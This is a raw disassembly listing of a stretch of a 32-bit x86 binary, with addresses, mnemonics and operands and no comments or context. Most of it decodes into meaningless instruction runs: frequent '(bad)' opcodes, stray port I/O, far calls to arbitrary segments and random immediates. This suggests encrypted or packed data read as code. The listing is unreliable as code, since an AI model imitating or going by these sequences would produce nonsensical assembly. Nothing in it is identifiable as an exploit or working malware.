  40d8b5:	(bad)  
  40d8b6:	xchg   BYTE PTR ss:[ecx],ch
  40d8b9:	mov    edx,0x41301978
  40d8be:	cs pop ebx
  40d8c0:	(bad)  
  40d8c1:	shr    BYTE PTR ds:0xbcfe08de,0x37
  40d8c8:	std    
  40d8c9:	add    esi,DWORD PTR [edx]
  40d8cb:	pop    edi
  40d8cc:	repnz inc ebx
  40d8ce:	sub    ah,BYTE PTR [edx+eax*1+0x44]
  40d8d2:	add    eax,0x7c4b2f1a
  40d8d7:	dec    edx
  40d8d8:	jmp    0x40d9c5
	...
  40d901:	add    BYTE PTR [eax],al
  40d903:	add    BYTE PTR [ecx+edi*4+0x33],dh
  40d907:	or     cl,al
  40d909:	pop    ds
  40d90a:	test   eax,0xe19b0381
  40d90f:	adc    al,0xb
  40d911:	fwait
  40d912:	nop
  40d913:	call   0x1fc7:0x189db9d0
  40d91a:	lods   eax,DWORD PTR ds:[esi]
  40d91b:	mov    ebx,ebp
  40d91d:	sahf   
  40d91e:	dec    esi
  40d91f:	mov    al,ds:0x5ae91c02
  40d924:	inc    ebp
  40d925:	pop    ebx
  40d926:	jmp    0x3f262e
  40d92b:	popa   
  40d92c:	mov    ecx,0x361c8b61
  40d931:	scas   al,BYTE PTR es:[edi]
  40d932:	mov    ds:0x4fc8f974,eax
  40d937:	pop    esi
  40d938:	sar    eax,0xfe
  40d93b:	fsubr  QWORD PTR [ecx-0x3d]
  40d93e:	jbe    0x40d8c8
  40d940:	dec    ebx
  40d941:	mov    eax,0xc359bcfe
  40d946:	xor    BYTE PTR [esi+0x2b],dl
  40d949:	mov    eax,0xe841bcfe
  40d94e:	inc    esp
  40d94f:	sub    DWORD PTR [edi+0x5302c01e],edi
  40d955:	rcl    BYTE PTR cs:[ecx],0x0
  40d959:	sar    dh,cl
  40d95b:	push   ss
  40d95c:	mov    ch,0x1e
  40d95e:	les    ecx,FWORD PTR ds:0x74c41eb5
  40d964:	leave  
  40d965:	enter  0x7c8a,0x0
	...
  40d991:	add    BYTE PTR [ecx],dl
  40d993:	repnz (bad)
  40d996:	cmp    eax,0x6845f35b
  40d99b:	aas    
  40d99c:	pop    ebp
  40d99d:	sub    BYTE PTR [edx-0xe],al
  40d9a0:	or     ch,cl
  40d9a2:	cmp    eax,0xb68df35b
  40d9a7:	or     BYTE PTR cs:[edx+0x78],ah
  40d9ab:	fs repz (bad) 
  40d9ae:	rcr    BYTE PTR [esi],0xe0
  40d9b1:	sbb    DWORD PTR [ebx],ebp
  40d9b3:	shl    BYTE PTR cs:[esi+0x7e79cb8],0x1d
  40d9bb:	mov    eax,0x9cc8a6fe
  40d9c0:	out    0x89,eax
  40d9c2:	jecxz  0x40d97b
  40d9c4:	(bad)  
  40d9c5:	xchg   ebp,eax
  40d9c6:	shr    BYTE PTR [esi],0xf0
  40d9c9:	pop    esp
  40d9ca:	enter  0xb8a0,0x0
  40d9ce:	ja     0x40da2c
  40d9d0:	add    BYTE PTR [eax],al
  40d9d2:	aam    0x17
  40d9d4:	lea    esi,[ebp-0x49]
  40d9d7:	adc    eax,0x5c570008
  40d9dc:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9de:	or     eax,0x6f458d5d
  40d9e3:	in     al,dx
  40d9e4:	out    0x68,al
  40d9e6:	mov    ch,0x5b
  40d9e8:	add    BYTE PTR [ebx+0x7d89ac0a],cl
  40d9ee:	sti    
  40d9ef:	sbb    al,0xef
  40d9f1:	add    ecx,DWORD PTR [edi+ecx*2]
  40d9f4:	je     0x40da5d
	...
  40da1e:	add    BYTE PTR [eax],al
  40da20:	jl     0x40da81
  40da22:	lea    eax,[ebp+0x7f]
  40da25:	in     al,dx
  40da26:	push   esp
  40da27:	push   esi
  40da28:	dec    edi
  40da29:	push   ebp
  40da2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da2b:	add    bh,ah
  40da2d:	fcmovb st,st(5)
  40da2f:	or     BYTE PTR [eax-0x1d8a009e],ah
  40da35:	pop    ebx
  40da36:	mov    dh,0x46
  40da38:	inc    eax
  40da39:	fcomi  st,st(7)
  40da3b:	or     BYTE PTR [eax+0x5a],cl
  40da3e:	sub    esi,eax
  40da40:	cld    
  40da41:	call   0x302ab54
  40da46:	jmp    FWORD PTR [ecx-0x59]
  40da49:	aad    0xfe
  40da4b:	imul   esp,DWORD PTR [edi-0x588a020f],0x9769fed5
  40da55:	push   ebx
  40da56:	mov    esi,0xb5ba781
  40da5b:	ror    BYTE PTR [ebx-0x6a],0x4e
  40da5f:	push   eax
  40da60:	jg     0x40da42
  40da62:	xchg   ebp,eax
  40da63:	call   eax
  40da65:	aaa    
  40da66:	fcomp  DWORD PTR [ecx+0x4d]
  40da69:	pop    edi
  40da6a:	push   0x0
  40da6c:	ss lock push esp
  40da6f:	(bad)  
  40da70:	ds push edi
  40da72:	hlt    
  40da73:	imul   edi,DWORD PTR [esi],0xbbe8045c
  40da79:	inc    edx
  40da7a:	add    al,0x0
  40da7c:	inc    ebp
  40da7d:	add    bl,BYTE PTR [ecx-0x412612f9]
  40da83:	xchg   ebp,eax
	...
  40daac:	add    BYTE PTR [eax],al
  40daae:	inc    ecx
  40daaf:	dec    eax
  40dab0:	(bad)  
  40dab2:	lds    eax,FWORD PTR [ecx+0x6b905eaf]
  40dab8:	inc    esi
  40dab9:	adc    BYTE PTR [esi],bh
  40dabb:	idiv   DWORD PTR [ebp-0x14]
  40dabe:	mov    ebp,0x6d571480
  40dac3:	dec    ecx
  40dac4:	das    
  40dac5:	dec    DWORD PTR [ebx+0x367511c8]
  40dacb:	sbb    al,0x3b
  40dacd:	nop
  40dace:	add    DWORD PTR [esi-0x538c014c],eax
  40dad4:	sbb    cl,BYTE PTR [esp+ecx*8-0x1974ecab]
  40dadb:	in     al,dx
  40dadc:	add    eax,0x988435f8
  40dae1:	inc    esi
  40dae2:	retf   
  40dae3:	pop    es
  40dae4:	pop    ss
  40dae5:	push   eax
  40dae6:	shr    DWORD PTR [edi],1
  40dae8:	(bad)  
  40dae9:	(bad)  
  40daea:	push   ebx
  40daeb:	mov    esp,0xc5c3ab1a
  40daf0:	adc    DWORD PTR [ecx+0x457fc003],ecx
  40daf6:	scas   al,BYTE PTR es:[edi]
  40daf7:	je     0x40db0c
  40daf9:	jne    0x40db35
  40dafb:	lea    edx,[edi+0x102b9607]
  40db01:	call   FWORD PTR [ecx-0x6e0837d5]
  40db07:	outs   dx,DWORD PTR ds:[esi]
  40db08:	adc    al,0xff
  40db0a:	adc    ebp,esp
  40db0c:	adc    DWORD PTR [ebp-0x76],esi
  40db0f:	add    eax,0xfb98
	...
  40db3c:	pop    bx
  40db3e:	clc    
  40db3f:	adc    DWORD PTR [ecx-0x4a],esi
  40db42:	jno    0x40db6f
  40db44:	imul   esi,DWORD PTR [eax],0xd0841b95
  40db4a:	lea    edx,[edx]
  40db4c:	pop    ecx
  40db4d:	xor    BYTE PTR [ecx+0x7dd06c1b],al
  40db53:	adc    dl,ah
  40db55:	pop    edx
  40db56:	push   ds
  40db57:	adc    ecx,ebx
  40db59:	bound  eax,QWORD PTR [ecx+0x65b5ca9d]
  40db5f:	jle    0x40db5e
  40db61:	adc    DWORD PTR [esi-0x169d03c4],edi
  40db67:	mov    eax,0x9069c6b4
  40db6c:	inc    ebp
  40db6d:	pop    ebp
  40db6e:	mov    ebx,0xd93010e4
  40db73:	adc    dl,BYTE PTR [ebx-0x4e45be9d]
  40db79:	mov    ch,0x2d
  40db7b:	adc    dh,BYTE PTR [ebx+0x4b]
  40db7e:	es cwde 
  40db80:	cmp    ebx,eax
  40db82:	dec    ebp
  40db83:	adc    cl,ch
  40db85:	mov    ch,0x15
  40db87:	cwde   
  40db88:	xor    DWORD PTR [esi-0x11e046d],esi
  40db8e:	add    edx,DWORD PTR [edx]
  40db90:	shl    DWORD PTR [ebp+0x2fc8f373],1
  40db96:	loope  0x40dbb3
  40db98:	je     0x40db50
  40db9a:	in     eax,dx
  40db9b:	adc    ebp,eax
  40db9d:	paddw  mm7,QWORD PTR [edx+0x0]
	...
  40dbc9:	add    BYTE PTR [esi+esi*4],bh
  40dbcc:	push   ebx
  40dbcd:	hlt    
  40dbce:	test   al,0x2f
  40dbd0:	loope  0x40dbed
  40dbd2:	mov    bh,0xb7
  40dbd4:	int    0x11
  40dbd6:	mov    ebp,0x804f537
  40dbdb:	dec    ebp
  40dbdc:	mov    esi,0xffb63997
  40dbe1:	cmp    eax,DWORD PTR [edx+0x4fac77bd]
  40dbe7:	mov    dh,0xfe
  40dbe9:	sbb    al,0x6a
  40dbeb:	mov    ah,0x74
  40dbed:	icebp  
  40dbee:	inc    ebp
  40dbef:	dec    eax
  40dbf0:	std    
  40dbf1:	xchg   esi,eax
  40dbf2:	dec    edi
  40dbf3:	mov    dh,0x74
  40dbf5:	stc    
  40dbf6:	mov    ebx,0x55fcff4d
  40dbfb:	mov    ebp,0xb62f5980
  40dc00:	(bad)  
  40dc01:	cld    
  40dc02:	dec    ebp
  40dc03:	mov    ah,0x74
  40dc05:	loope  0x40dc5c
  40dc07:	test   eax,0xa24f668e
  40dc0c:	sar    ecx,0x3d
  40dc0f:	push   cs
  40dc10:	mov    eax,DWORD PTR [ebp+0x4f]
  40dc13:	cs or  al,0xc3
  40dc16:	cmp    al,0xb4
  40dc18:	je     0x40dc0b
  40dc1a:	xor    eax,0x2f3e9039
  40dc1f:	mov    ah,0x74
  40dc21:	in     eax,0x2e
  40dc23:	or     BYTE PTR cs:[ecx+0x27],al
  40dc27:	mov    ch,0xfe
  40dc29:	es jae 0x40dc3a
  40dc2c:	adc    BYTE PTR [eax+0x0],dh
	...
  40dc57:	add    BYTE PTR [eax-0x4c],al
  40dc5a:	je     0x40dc41
  40dc5c:	dec    esi
  40dc5d:	or     BYTE PTR cs:[ecx],al
  40dc60:	pop    ss
  40dc61:	mov    ch,0xfe
  40dc63:	push   es
  40dc64:	push   ebx
  40dc65:	push   cs
  40dc66:	adc    al,0x70
  40dc68:	inc    eax
  40dc69:	mov    ah,0x74
  40dc6b:	in     eax,0x2e
  40dc6d:	or     BYTE PTR cs:[ecx],al
  40dc70:	pop    es
  40dc71:	mov    ch,0xfe
  40dc73:	out    0x32,al
  40dc75:	push   cs
  40dc76:	sbb    BYTE PTR [eax+0x43],dh
  40dc79:	mov    ds:0xe3dfdc1,al
  40dc7e:	mov    edi,DWORD PTR [ebp+0xeb9fc2]
  40dc84:	xor    edx,esi
  40dc86:	std    
  40dc87:	jne    0x40dcfc
  40dc89:	(bad)  
  40dc8a:	(bad)  
  40dc8b:	inc    BYTE PTR [edx-0x49]
  40dc8e:	out    0x19,al
  40dc90:	pop    ss
  40dc91:	dec    ebx
  40dc92:	(bad)  
  40dc93:	call   DWORD PTR [edx-0x4d]
  40dc96:	std    
  40dc97:	jne    0x40dd08
  40dc99:	push   eax
  40dc9a:	mov    cl,BYTE PTR [edi-0xf74b438]
  40dca0:	mov    esi,0x67ffffa7
  40dca5:	aaa    
  40dca6:	inc    ebp
  40dca7:	adc    al,0xd4
  40dca9:	lahf   
  40dcaa:	(bad)  
  40dcab:	je     0x40dcff
  40dcad:	push   ecx
  40dcae:	add    DWORD PTR ss:[edi],esp
  40dcb1:	pop    eax
  40dcb2:	mov    DWORD PTR [ebp-0x65],0x17000058
  40dcb9:	xor    eax,0xfc45
	...
  40dce6:	out    0x4a,eax
  40dce8:	jne    0x40dcfe
  40dcea:	mov    ch,cl
  40dcec:	push   cs
  40dced:	call   edx
  40dcef:	scas   eax,DWORD PTR es:[edi]
  40dcf0:	out    0xf2,al
  40dcf2:	dec    ecx
  40dcf3:	dec    ebx
  40dcf4:	dec    DWORD PTR [ebx-0x38320b1]
  40dcfa:	out    0xcb,eax
  40dcfc:	and    DWORD PTR [eax-0x38],ebp
  40dcff:	add    al,0x40
  40dd01:	add    BYTE PTR [eax-0x33],cl
  40dd04:	cli    
  40dd05:	call   0x40b5f1
  40dd0a:	fcom   QWORD PTR [edi]
  40dd0c:	jne    0x40dd1b
  40dd0e:	scas   eax,DWORD PTR es:[edi]
  40dd0f:	rcr    BYTE PTR [ebx+0x41],cl
  40dd12:	xlat   BYTE PTR ds:[ebx]
  40dd13:	dec    edx
  40dd14:	jne    0x40dd12
  40dd16:	aas    
  40dd17:	dec    ebx
  40dd18:	add    BYTE PTR [eax],0xa7
  40dd1b:	xor    BYTE PTR [ebp-0x14],al
  40dd1e:	mov    WORD PTR [ebx-0x39],ds
  40dd21:	inc    ebp
  40dd22:	jnp    0x40dd82
  40dd24:	add    BYTE PTR [eax],al
  40dd26:	ds ret 0x7d81
  40dd2a:	stos   BYTE PTR es:[edi],al
  40dd2b:	rcl    DWORD PTR [esi+0x2c32617],0xef
  40dd32:	enter  0x98f4,0xb
  40dd36:	xchg   esi,eax
  40dd37:	mov    ?,WORD PTR [ebx-0x1]
  40dd3a:	jns    0x40dd40
  40dd3c:	cdq    
  40dd3d:	sti    
  40dd3e:	jno    0x40dd96
  40dd40:	add    al,ch
  40dd42:	repnz xor cl,BYTE PTR [edi]
  40dd45:	call   DWORD PTR [edi+0x38]
  40dd48:	add    al,0x0
	...
  40dd72:	add    BYTE PTR [eax],al
  40dd74:	ds cmp ecx,ecx
  40dd77:	adc    edi,DWORD PTR [ebp+0x43750299]
  40dd7d:	retf   
  40dd7e:	test   DWORD PTR [eax],eax
  40dd80:	ds ret 0x4545
  40dd84:	lds    eax,FWORD PTR ss:[edx]
  40dd87:	add    BYTE PTR [esi],bh
  40dd89:	or     ecx,0x2c43ef3
  40dd8f:	add    cl,bh
  40dd91:	call   DWORD PTR [edx]
  40dd93:	add    BYTE PTR [esi],bh
  40dd95:	les    eax,FWORD PTR [edx]
  40dd97:	lea    edi,[ebx+0x74]
  40dd9a:	mov    ah,0x8c
  40dd9c:	sub    DWORD PTR [eax-0x4c],0xffffff8c
  40dda0:	jnp    0x40de0e
  40dda2:	mov    ah,0xfe
  40dda4:	jae    0x40dd2e
  40dda6:	or     eax,0x254c4675
  40ddab:	(bad)  
  40ddac:	jmp    0xd2be6102
  40ddb1:	les    edx,FWORD PTR [esi+0xadfbd32]
  40ddb7:	add    BYTE PTR [edx-0x79],cl
  40ddba:	cmp    DWORD PTR [ebp-0x2e],0xbd0597c4
  40ddc1:	daa    
  40ddc2:	adc    eax,DWORD PTR [eax]
  40ddc4:	xor    ah,BYTE PTR [ebx+0x5bb6750d]
  40ddca:	out    0x98,al
  40ddcc:	xor    eax,0xa174f9c3
  40ddd1:	mov    dl,0xd5
  40ddd3:	cwde   
  40ddd4:	lea    esi,[edx+0x53]
	...
  40de02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de03:	arpl   WORD PTR [eax+0xe],bx
  40de06:	mov    DWORD PTR [edx+0x28811433],esi
  40de0c:	in     eax,0x1b
  40de0e:	jnp    0x40dddb
  40de10:	lods   eax,DWORD PTR ds:[esi]
  40de11:	push   cs
  40de12:	jno    0x40de3c
  40de14:	mov    eax,ds:0x9dce5c1b
  40de19:	push   cs
  40de1a:	popa   
  40de1b:	sub    BYTE PTR [ebp-0x72318be5],bl
  40de21:	push   cs
  40de22:	push   ecx
  40de23:	sub    BYTE PTR [ecx+0x1b],bh
  40de26:	ins    BYTE PTR es:[edi],dx
  40de27:	into   
  40de28:	jge    0x40de38
  40de2a:	icebp  
  40de2b:	gs jbe 0x40de2c
  40de2e:	ret    0x6e3f
  40de31:	push   cs
  40de32:	xor    esi,ebx
  40de34:	jecxz  0x40de55
  40de36:	ds daa 
  40de38:	call   FWORD PTR [ecx-0x244edf]
  40de3e:	and    DWORD PTR [ebp+0x79],eax
  40de41:	push   cs
  40de42:	adc    DWORD PTR [ebp-0x17],eax
  40de45:	push   cs
  40de46:	xchg   ebx,eax
  40de47:	pop    edi
  40de48:	push   ecx
  40de49:	mov    ds:0x9935b1b1,eax
  40de4e:	stc    
  40de4f:	mov    al,0xb3
  40de51:	(bad)  
  40de52:	(bad)  [eax]
  40de54:	jns    0x40de64
  40de56:	jmp    0xd650720c
  40de5b:	iret   
  40de5c:	jns    0x40de6c
  40de5e:	fldenv [eax]
  40de60:	loop   0x40de77
  40de62:	inc    ecx
  40de63:	fadd   DWORD PTR [ebx+0xd]
	...
  40de8e:	add    BYTE PTR [eax],al
  40de90:	leave  
  40de91:	mov    cl,0x9d
  40de93:	lods   eax,DWORD PTR ds:[esi]
  40de94:	neg    BYTE PTR [edi+edi*8-0x74f7c228]
  40de9b:	std    
  40de9c:	mov    edi,0x3b3fe396
  40dea1:	sub    BYTE PTR [eax],cl
  40dea3:	rcl    edi,1
  40dea5:	in     al,0xfe
  40dea7:	(bad)  
  40dea8:	adc    eax,0xc16af418
  40dead:	lods   eax,DWORD PTR ds:[esi]
  40deae:	(bad)  
  40deb1:	jmp    0x5b7ec7b6
  40deb6:	pop    esi
  40deb7:	mov    al,ds:0xae0062fc
  40debc:	leave  
  40debd:	pop    ecx
  40debe:	call   0xfef2c7d7
  40dec3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dec4:	jns    0x40de6f
  40dec6:	add    cl,ch
  40dec8:	cmp    eax,0x42248d5b
  40decd:	or     edi,edi
  40decf:	cld    
  40ded0:	inc    ebp
  40ded1:	mov    ecx,0xb2336cfc
  40ded6:	mov    BYTE PTR [esi+ecx*2],ch
  40ded9:	fdivr  QWORD PTR [ecx+esi*2+0x3a]
  40dedd:	daa    
  40dede:	or     al,0x6a
  40dee0:	mov    ecx,0x3bdb01b4
  40dee5:	fdivr  QWORD PTR [ebp+edx*2+0x40]
  40dee9:	sub    DWORD PTR [edx],ecx
  40deeb:	xchg   ecx,eax
  40deec:	cmp    eax,0xdbe9005b
  40def1:	mov    ds:0xf1c1,eax
	...
  40df1e:	cmp    eax,0xb23144de
  40df23:	mov    cl,0x74
  40df25:	loope  0x40df7c
  40df27:	lea    ecx,[esi+eiz*1+0x217cdc3b]
  40df2e:	cmp    ah,BYTE PTR [edi]
  40df30:	add    al,0xe2
  40df32:	jge    0x40df5b
  40df34:	or     dl,BYTE PTR [ecx+0x3d]
  40df37:	pop    ebx
  40df38:	add    BYTE PTR [eax],al
  40df3a:	xlat   BYTE PTR ds:[ebx]
  40df3b:	inc    bh
  40df3d:	ret    0x5ccf
  40df40:	cmp    DWORD PTR [ebp-0x4d],0x59
  40df44:	jb     0x40df65
  40df46:	adc    bl,BYTE PTR [eax-0x40f2af0a]
  40df4c:	std    
  40df4d:	jne    0x40defe
  40df4f:	push   esp
  40df50:	mov    ?,WORD PTR cs:[eax+0x5f]
  40df54:	lea    eax,[ebp+0x6f]
  40df57:	in     al,dx
  40df58:	std    
  40df59:	jne    0x40deea
  40df5b:	push   esp
  40df5c:	sahf   
  40df5d:	(bad)  
  40df5e:	rcr    BYTE PTR [edi-0x77],0x45
  40df62:	mov    edx,DWORD PTR [ebx+0x1d]
  40df65:	lea    ebx,[edx]
  40df67:	pop    edi
  40df68:	push   eax
  40df69:	dec    DWORD PTR [edx-0x51]
  40df6c:	out    0x8d,al
  40df6e:	rcr    BYTE PTR [esi-0x1],cl
  40df71:	mov    DWORD PTR [edx],ebp
  40df73:	or     DWORD PTR [ebp+0x68ecaf45],0x4
  40df7a:	ror    cl,0x6
  40df7d:	call   0x400dd9
	...
  40dfaa:	add    BYTE PTR [eax],al
  40dfac:	mov    ds:0xa050f699,al
  40dfb1:	leave  
  40dfb2:	push   es
  40dfb3:	call   0x40421c
  40dfb8:	xchg   esp,eax
  40dfb9:	loope  0x40df9d
  40dfbb:	add    edx,edi
  40dfbd:	mov    ebp,0xec6f458b
  40dfc2:	std    
  40dfc3:	jne    0x40df48
  40dfc5:	pop    edi
  40dfc6:	jne    0x40dfd4
  40dfc8:	inc    eax
  40dfc9:	leave  
  40dfca:	push   es
  40dfcb:	call   0x404091
  40dfd0:	xchg   edx,eax
  40dfd1:	cdq    
  40dfd2:	not    BYTE PTR [eax+0x20]
  40dfd5:	leave  
  40dfd6:	push   es
  40dfd7:	call   0x40424c
  40dfdc:	ds inc ebp
  40dfde:	mov    ?,edi
  40dfe0:	ds xbegin 0x3031e9e
  40dfe7:	add    BYTE PTR [eax+0x6b],ah
  40dfea:	inc    ecx
  40dfeb:	or     BYTE PTR [esi],bh
  40dfed:	aaa    
  40dfee:	(bad)  
  40dfef:	test   DWORD PTR [esi],0xa9fb94c1
  40dff5:	push   cs
  40dff6:	clc    
  40dff7:	(bad)  
  40dff8:	sub    ebp,DWORD PTR [edx-0x77647fe6]
  40dffe:	or     al,BYTE PTR [ebx+0x75038a13]
  40e004:	xor    al,0xda
  40e006:	add    eax,DWORD PTR [eax]
  40e008:	ds ret 0xc8a8
  40e00c:	jl     0x40dfc7
  40e00e:	add    cl,BYTE PTR [ebp+0x0]
	...
  40e038:	add    BYTE PTR [eax],al
  40e03a:	sti    
  40e03b:	jmp    0xaa34def3
  40e040:	sbb    cl,BYTE PTR [esi]
  40e042:	mov    bl,0xd0
  40e044:	or     cl,BYTE PTR [ebx+0xeda4e]
  40e04a:	ds ret 0x7509
  40e04e:	ss retf 0x8e48
  40e052:	inc    ecx
  40e053:	xor    bh,cl
  40e055:	inc    esp
  40e056:	xor    dh,BYTE PTR [eax-0x3ad61701]
  40e05c:	add    al,BYTE PTR [eax]
  40e05e:	mov    ebp,0xac0606b7
  40e063:	pop    eax
  40e064:	jns    0x40e0ab
  40e066:	push   ss
  40e067:	cmc    
  40e068:	or     DWORD PTR [ebp+0x46],esi
  40e06b:	sbb    al,0x27
  40e06d:	mov    WORD PTR [ecx],cs
  40e06f:	push   ss
  40e070:	jns    0x40e0b7
  40e072:	push   es
  40e073:	aad    0x9
  40e075:	jne    0x40e0bd
  40e077:	sbb    al,0xce
  40e079:	stc    
  40e07a:	icebp  
  40e07b:	jge    0x40e0f6
  40e07d:	inc    ebp
  40e07e:	out    0x5b,al
  40e080:	mov    ecx,0x11636b0a
  40e085:	fcmovbe st,st(7)
  40e087:	scas   al,BYTE PTR es:[edi]
  40e088:	adc    eax,0xb8b37b79
  40e08d:	or     dl,BYTE PTR [ebx+0x63]
  40e090:	adc    DWORD PTR [edi],esi
  40e092:	lds    ebp,FWORD PTR [esi-0x54fc8303]
  40e098:	arpl   cx,ax
  40e09a:	test   eax,0x90ee0b
	...
  40e0c7:	add    BYTE PTR [ecx-0x3d],al
  40e0ca:	lods   al,BYTE PTR ds:[esi]
  40e0cb:	push   cs
  40e0cc:	mov    eax,ds:0xa5c06fae
  40e0d1:	loopne 0x40e0fe
  40e0d3:	or     al,0xee
  40e0d5:	lods   eax,DWORD PTR ds:[esi]
  40e0d6:	push   ebx
  40e0d7:	cld    
  40e0d8:	mov    eax,ds:0x810ac1e8
  40e0dd:	in     al,0x23
  40e0df:	sbb    al,0xbd
  40e0e1:	xor    BYTE PTR [ecx+0x6a29ea03],bh
  40e0e7:	mov    BYTE PTR [ebp+0x5b],dl
  40e0ea:	sbb    eax,0x9130bc99
  40e0ef:	add    edx,edx
  40e0f1:	xor    eax,0x5b49886a
  40e0f6:	adc    eax,0x23dae1a5
  40e0fb:	lds    eax,FWORD PTR [ecx-0x53]
  40e0fe:	repz adc esp,DWORD PTR [esi]
  40e101:	sbb    al,0xf7
  40e103:	add    edi,DWORD PTR [esi]
  40e105:	bound  ebp,QWORD PTR [ecx-0x29bcb470]
  40e10b:	test   al,0x7e
  40e10d:	pop    ebx
  40e10e:	pop    esi
  40e10f:	nop
  40e110:	sub    ebx,eax
  40e112:	sbb    BYTE PTR [edx+0x43e1ae11],cl
  40e118:	xchg   ebx,eax
  40e119:	pusha  
  40e11a:	rcl    DWORD PTR [edx+0xae91c62],1
  40e120:	jae    0x40e0cd
  40e122:	inc    DWORD PTR [eax-0x1c]
  40e125:	das    
  40e126:	add    cl,ch
  40e128:	call   0x118551a
	...
  40e155:	add    ch,al
  40e157:	lods   eax,DWORD PTR ds:[esi]
  40e158:	dec    BYTE PTR [esi]
  40e15a:	xchg   DWORD PTR [esi+0x2235e574],ebp
  40e160:	mov    cs,WORD PTR [esi]
  40e162:	xor    al,0xae
  40e164:	je     0x40e15f
  40e166:	aaa    
  40e167:	sub    BYTE PTR [ecx+edx*1],cl
  40e16a:	and    ebx,ebp
  40e16c:	(bad)  
  40e16d:	test   BYTE PTR [edi+0x28],0xec
  40e171:	out    dx,al
  40e172:	mov    ecx,0x247ee861
  40e177:	scas   al,BYTE PTR es:[edi]
  40e178:	(bad)  
  40e179:	fmulp  st(1),st
  40e17b:	mov    ch,0xfe
  40e17d:	pop    esp
  40e17e:	xchg   esi,eax
  40e17f:	mov    ch,0x8b
  40e181:	pop    edi
  40e182:	aaa    
  40e183:	scas   al,BYTE PTR es:[edi]
  40e184:	(bad)  
  40e185:	cmp    al,0x2a
  40e187:	ret    
  40e188:	jo     0x40e1e2
  40e18a:	inc    edi
  40e18b:	scas   al,BYTE PTR es:[edi]
  40e18c:	(bad)  
  40e18d:	cmp    al,0x56
  40e18f:	ret    
  40e190:	push   0xfeae3758
  40e195:	sbb    al,0x42
  40e197:	ret    
  40e198:	pusha  
  40e199:	js     0x40e1e2
  40e19b:	scas   al,BYTE PTR es:[edi]
  40e19c:	dec    ebp
  40e19d:	push   0xffffffb9
  40e19f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1a0:	call   DWORD PTR [edx+ecx*2]
  40e1a3:	pusha  
  40e1a4:	div    dh
  40e1a6:	shl    BYTE PTR [ebp-0x1fb88103],0x44
  40e1ad:	jno    0x40e193
  40e1af:	mov    ds:0x63de1c1,eax
  40e1b4:	mov    edx,DWORD PTR [ebp-0x45]
  40e1b7:	xchg   edi,eax
  40e1b8:	sti    
  40e1b9:	pop    esi
	...
  40e1e2:	add    BYTE PTR [eax],al
  40e1e4:	leave  
  40e1e5:	pusha  
  40e1e6:	call   0xfeed67e0
  40e1eb:	loop   0x40e26a
  40e1ed:	es das 
  40e1ef:	add    BYTE PTR [edx-0x70af0514],cl
  40e1f5:	xor    cl,BYTE PTR [eax+0x756228ff]
  40e1fb:	cld    
  40e1fc:	sbb    ah,bl
  40e1fe:	or     ch,al
  40e200:	push   esp
  40e201:	sub    eax,0x18ccffff
  40e206:	je     0x40e217
  40e208:	sub    ah,bl
  40e20a:	push   es
  40e20b:	push   DWORD PTR [edx+0x3a87e854]
  40e211:	(bad)  
  40e212:	dec    DWORD PTR [ebx]
  40e214:	addr16 fdiv st(6),st
  40e217:	(bad)  
  40e218:	xor    dl,BYTE PTR [eax+ebp*8-0x78]
  40e21c:	pop    ds
  40e21d:	(bad)  
  40e21e:	dec    ecx
  40e220:	aad    0xb0
  40e222:	(bad)  
  40e223:	push   esp
  40e224:	or     al,0x44
  40e226:	add    esp,0xffff62b3
  40e22c:	loopne 0x40e25b
  40e22e:	mov    eax,0x6378fe
  40e233:	add    BYTE PTR [edi+0x58],ah
  40e236:	mov    eax,DWORD PTR [ebp+0x5b]
  40e239:	scas   eax,DWORD PTR es:[edi]
  40e23a:	mov    esi,0x37d86274
  40e23f:	add    BYTE PTR [edx-0x54],al
  40e242:	out    0x51,eax
  40e244:	pop    ax
  40e246:	add    bh,bh
	...
  40e270:	add    BYTE PTR [eax],al
  40e272:	xor    dh,BYTE PTR [ebx+0x62db29e6]
  40e278:	dec    DWORD PTR [ebx]
  40e27a:	xchg   edi,eax
  40e27b:	fisttp QWORD PTR ds:0x3ff2c468
  40e281:	add    BYTE PTR [eax+0x40e80add],ch
  40e287:	sub    edi,edi
  40e289:	dec    DWORD PTR [ebp+eiz*4-0x6717179a]
  40e290:	(bad)  
  40e291:	(bad)  
  40e292:	ds (bad) 
  40e294:	mul    bh
  40e296:	data16 es or bh,bh
  40e29a:	mov    bh,0x3e
  40e29c:	dec    ebx
  40e29d:	(bad)  
  40e29e:	stc    
  40e29f:	ins    BYTE PTR es:[edi],dx
  40e2a0:	fwait
  40e2a1:	cmp    eax,0x8d02c23f
  40e2a6:	ret    
  40e2a7:	jg     0x40e2b2
  40e2a9:	jmp    ecx
  40e2ab:	icebp  
  40e2ac:	sbb    dl,al
  40e2ae:	scas   al,BYTE PTR es:[edi]
  40e2af:	dec    esp
  40e2b0:	or     BYTE PTR [ebp-0xf68045],cl
  40e2b6:	leave  
  40e2b7:	icebp  
  40e2b8:	pop    es
  40e2b9:	mov    ch,0x86
  40e2bb:	push   ebx
  40e2bc:	or     bh,bh
  40e2be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e2bf:	mov    edi,0x3ab1ff86
  40e2c4:	jle    0x40e282
  40e2c6:	test   al,0xbc
  40e2c8:	push   es
  40e2c9:	inc    eax
  40e2ca:	xor    DWORD PTR [esi],edi
  40e2cc:	adc    eax,DWORD PTR [eax]
  40e2ce:	ds ret 0x9577
  40e2d2:	jl     0x40e257
  40e2d4:	push   es
  40e2d5:	inc    DWORD PTR [eax]
	...
  40e2ff:	add    BYTE PTR [ecx-0x7e000d41],dl
  40e305:	ror    DWORD PTR [esi-0x27803484],0x4f
  40e30c:	out    0xc3,al
  40e30e:	mov    dh,0x40
  40e310:	ds call 0xbff9:0xc23e7b26
  40e318:	shl    DWORD PTR [esi-0x3dc156e5],cl
  40e31e:	add    cl,BYTE PTR [ebp-0xfa004d]
  40e324:	inc    ecx
  40e325:	es ret 0x8e2b
  40e329:	dec    esp
  40e32a:	and    al,0x4f
  40e32c:	jg     0x40e2e2
  40e32e:	sbb    al,dl
  40e330:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e331:	mov    ah,0x2
  40e333:	or     edi,esi
  40e335:	pop    ebx
  40e336:	fadd   QWORD PTR [eax]
  40e338:	daa    
  40e339:	fsubr  st,st(0)
  40e33b:	add    edi,DWORD PTR [esi]
